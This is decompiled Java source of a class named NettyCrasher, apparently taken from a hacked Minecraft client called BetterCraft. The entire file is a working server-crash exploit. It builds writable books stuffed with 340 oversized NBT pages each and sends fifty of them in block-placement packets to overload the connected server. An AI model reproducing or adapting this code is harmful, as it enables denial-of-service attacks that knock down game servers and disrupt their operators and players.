/*    */ package me.nzxter.bettercraft.mods.crasher;
/*    */ 
/*    */ import java.util.Random;
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.init.Items;
/*    */ import net.minecraft.item.ItemStack;
/*    */ import net.minecraft.nbt.NBTBase;
/*    */ import net.minecraft.nbt.NBTTagCompound;
/*    */ import net.minecraft.nbt.NBTTagList;
/*    */ import net.minecraft.nbt.NBTTagString;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
/*    */ import net.minecraft.util.math.BlockPos;
/*    */ 
/*    */ public class NettyCrasher {
/*    */   public static void start() {
/* 17 */     (new Thread()
/*    */       {
/*    */         public void run()
/*    */         {
/* 21 */           for (int i2 = 0; i2 < 50; i2++) {
/* 22 */             ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
/* 23 */             String author = "Netty" + (new Random()).nextInt(50);
/* 24 */             String size = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
/* 25 */             NBTTagCompound tag = new NBTTagCompound();
/* 26 */             NBTTagList list = new NBTTagList();
/* 27 */             for (int i3 = 0; i3 < 340; i3++) {
/* 28 */               String siteContent = size;
/* 29 */               NBTTagString tString = new NBTTagString(siteContent);
/* 30 */               list.appendTag((NBTBase)tString);
/*    */             } 
/* 32 */             tag.setString("author", author);
/* 33 */             tag.setString("title", "");
/* 34 */             tag.setTag("pages", (NBTBase)list);
/* 35 */             if (book.hasTagCompound()) {
/* 36 */               NBTTagCompound tagb = book.getTagCompound();
/* 37 */               tagb.setTag("pages", (NBTBase)list);
/*    */             } else {
/* 39 */               book.setTagInfo("pages", (NBTBase)list);
/*    */             } 
/* 41 */             (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketPlayerBlockPlacement(new BlockPos((Minecraft.getMinecraft()).player.posX, (Minecraft.getMinecraft()).player.posY - 2.0D, (Minecraft.getMinecraft()).player.posZ), 1, book, 0.0F, 0.0F, 0.0F));
/*    */           } 
/*    */         }
/* 44 */       }).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\NettyCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */